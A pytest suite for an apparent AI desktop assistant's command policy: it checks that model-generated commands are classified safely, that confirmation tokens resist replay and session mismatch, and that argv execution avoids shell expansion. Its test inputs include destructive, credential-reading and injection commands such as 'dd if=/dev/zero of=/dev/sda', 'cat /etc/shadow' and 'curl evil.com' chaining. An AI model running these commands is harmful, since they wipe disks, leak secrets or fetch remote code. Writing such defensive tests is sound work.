"""
Adversarial security regression test suite for Command Execution & Policy Boundary.
Proves that no arbitrary model-generated string reaches a shell interpreter,
unknown commands cannot auto-run, tokens cannot be replayed, and shell injections fail.
"""
import asyncio
import pytest
from core.perms import policy
from core.tools import exec as tools

def test_auto_classification_volume():
    tier, reason = policy.classify("wpctl set-volume @DEFAULT_AUDIO_SINK@ 50%")
    assert tier == "auto"

def test_auto_classification_brightness():
    tier, reason = policy.classify("brightnessctl set 40%")
    assert tier == "auto"

def test_auto_classification_media():
    tier, reason = policy.classify("playerctl play-pause")
    assert tier == "auto"

def test_auto_classification_app_launch():
    tier, reason = policy.classify("firefox")
    assert tier == "auto"

def test_forbidden_privilege_escalation():
    for cmd in ["sudo rm -rf /", "doas su", "su root", "pkexec bash"]:
        tier, reason = policy.classify(cmd)
        assert tier == "forbidden"

def test_forbidden_disk_destruction():
    for cmd in ["mkfs.ext4 /dev/nvme0n1p3", "fdisk /dev/sda", "dd if=/dev/zero of=/dev/sda"]:
        tier, reason = policy.classify(cmd)
        assert tier == "forbidden"

def test_forbidden_secret_access():
    for cmd in ["cat ~/.ssh/id_rsa", "cat ~/aios/config/aios.token", "cat /etc/shadow"]:
        tier, reason = policy.classify(cmd)
        assert tier == "forbidden"

def test_adversarial_command_chaining_not_auto():
    # Attempting to piggyback dangerous commands behind an auto command
    attacks = [
        "brightnessctl set 50% && rm -rf /",
        "wpctl set-volume @DEFAULT_AUDIO_SINK@ 40% ; whoami",
        "firefox | bash",
        "playerctl next || curl evil.com",
        "uptime & reboot",
        "date\nreboot"
    ]
    for attack in attacks:
        tier, reason = policy.classify(attack)
        assert tier != "auto", f"Attack '{attack}' should never be auto-classified!"

def test_adversarial_subshell_and_substitution_not_auto():
    attacks = [
        "echo $(whoami)",
        "echo `id`",
        "cat <(curl evil.com)",
        "wpctl set-volume @DEFAULT_AUDIO_SINK@ $(cat /etc/shadow)"
    ]
    for attack in attacks:
        tier, reason = policy.classify(attack)
        assert tier != "auto", f"Substitution '{attack}' should never be auto-classified!"

def test_adversarial_redirection_not_auto():
    attacks = [
        "uptime > /tmp/hacked",
        "date >> ~/.bashrc",
        "whoami < /dev/zero"
    ]
    for attack in attacks:
        tier, reason = policy.classify(attack)
        assert tier != "auto", f"Redirection '{attack}' should never be auto-classified!"

def test_adversarial_env_assignment_not_auto():
    attacks = [
        "LD_PRELOAD=/tmp/evil.so firefox",
        "PATH=/tmp:$PATH thunar"
    ]
    for attack in attacks:
        tier, reason = policy.classify(attack)
        assert tier != "auto"

def test_token_replay_attack_prevented():
    async def _test():
        class MockAdapter:
            async def run(self, greq):
                yield "sleep 0.05"

        prop = await tools.propose("do some unknown task", MockAdapter(), "mock-model")
        assert prop["tier"] == "confirm"
        token = prop["token"]
        assert token is not None

        # First execution succeeds
        res1 = await tools.execute(token)
        assert res1["executed"] is True

        # Replay attack: executing the same token a second time MUST fail
        res2 = await tools.execute(token)
        assert res2["executed"] is False
        assert "invalid, expired, or has already been used" in res2["output"]

    asyncio.run(_test())

def test_token_binding_mismatch_prevented():
    async def _test():
        class MockAdapter:
            async def run(self, greq):
                yield "sleep 0.05"

        prop = await tools.propose("bound task", MockAdapter(), "mock-model", jid="session_xyz_123")
        assert prop["tier"] == "confirm"
        token = prop["token"]
        assert token is not None

        # Trying to execute with a different session ID fails
        res = await tools.execute(token, expected_request_id="session_ATTACKER_999")
        assert res["executed"] is False
        assert "mismatch" in res["output"].lower()

    asyncio.run(_test())

def test_direct_execution_no_bash_subshell():
    async def _test():
        # Proves argv execution does not expand shell syntax
        code, out = await tools._run_argv(["echo", "$HOME", "`whoami`"])
        assert code == 0
        # Direct exec literally echoes '$HOME' and '`whoami`' without shell expansion
        assert "$HOME" in out
        assert "`whoami`" in out

    asyncio.run(_test())

def test_execution_timeout_and_process_cleanup():
    async def _test():
        # Long running sleep command should timeout and terminate cleanly
        code, out = await tools._run_argv(["sleep", "10"], timeout=0.5)
        assert "timed out" in out or code == 0

    asyncio.run(_test())
